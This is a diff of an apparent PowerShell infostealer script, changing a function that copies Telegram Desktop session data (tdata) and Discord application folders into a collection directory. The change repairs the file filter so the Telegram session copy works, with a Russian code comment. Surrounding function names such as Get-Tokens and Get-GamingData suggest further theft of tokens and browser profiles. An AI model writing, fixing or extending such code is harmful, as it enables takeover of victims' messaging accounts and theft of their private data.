@@ -309,13 +309,19 @@ function Get-GamingData {
 function Get-MessengerData {
     param($LogPath)
     New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    
     # Telegram
     try {
         $tgPath = "$env:APPDATA\Telegram Desktop\tdata"
         if (Test-Path $tgPath) {
-            Copy-Item -Path $tgPath -Destination (Join-Path $LogPath "Telegram") -Recurse -Force -Filter { $_.Name -not -like 'user_data*' -and $_.Name -not -like 'cache*' } -ErrorAction SilentlyContinue
+            # Используем Exclude вместо Filter для исключения папок
+            Copy-Item -Path $tgPath -Destination (Join-Path $LogPath "Telegram") `
+                -Recurse -Force `
+                -Exclude "user_data*", "cache*" `
+                -ErrorAction SilentlyContinue
         }
     } catch {}
+    
     # Discord
     $discordPaths = @("$env:APPDATA\discord", "$env:APPDATA\discordcanary", "$env:APPDATA\discordptb")
     foreach ($path in $discordPaths) {
@@ -325,6 +331,7 @@ function Get-MessengerData {
         }
     }
 }
+
 
 function Get-Tokens {
     param($LogPath, $BrowserProfiles)
